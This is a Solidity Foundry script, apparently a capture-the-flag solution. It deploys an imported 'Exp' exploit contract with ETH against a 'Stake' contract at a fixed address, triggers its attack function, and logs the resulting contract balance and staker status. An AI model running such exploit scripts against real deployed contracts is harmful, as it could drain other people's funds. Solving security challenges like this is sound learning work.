// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Stake.sol";
import "@openzeppelin/token/ERC20/ERC20.sol";
import "../src/Stake_exp.sol";

import {console, Script} from "forge-std/Script.sol";

contract StakeScript is Script{
    uint256 public deployer;
    Stake stake;
    
    TestCoin coin;
    Exp exp;
    function setUp() public {
        // deployer = vm.envUint("ANVIL_PRIVATE_KEY_2");
        deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        // coin = new TestCoin();
        // stake = new Stake(address(coin));
        stake = Stake(payable(address(0x6EB9c7DD6ea96244d2297E5d32EA21E382a821Fe)));
        vm.stopBroadcast();
    }

    function run() public{
        // address player = address(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266);
        address player = address(0x3CeE531D7d776D3370484A881bE380dEa317af9e);
        // deployer = vm.envUint("ANVIL_PRIVATE_KEY");
        vm.startBroadcast(deployer);
        exp = new Exp{value: 0.0012 ether}(address(stake));
        exp.attack();
        stake.StakeETH{value: 0.0011 ether}();
        stake.Unstake(0.0011 ether);
        uint256 t = address(stake).balance;
        console.log("[+]Balance of the Stake contract: ",t);
        uint totalStaked = stake.totalStaked();
        console.log("[+]totalStaked of the Stake contract: ", totalStaked);
        bool con = stake.Stakers(player);
        console.log("[+]I must be a staker: ",con);
        uint playerasset = stake.UserStake(player);
        console.log("[+]My staked balance: ",playerasset);
        vm.stopBroadcast();


    }
} 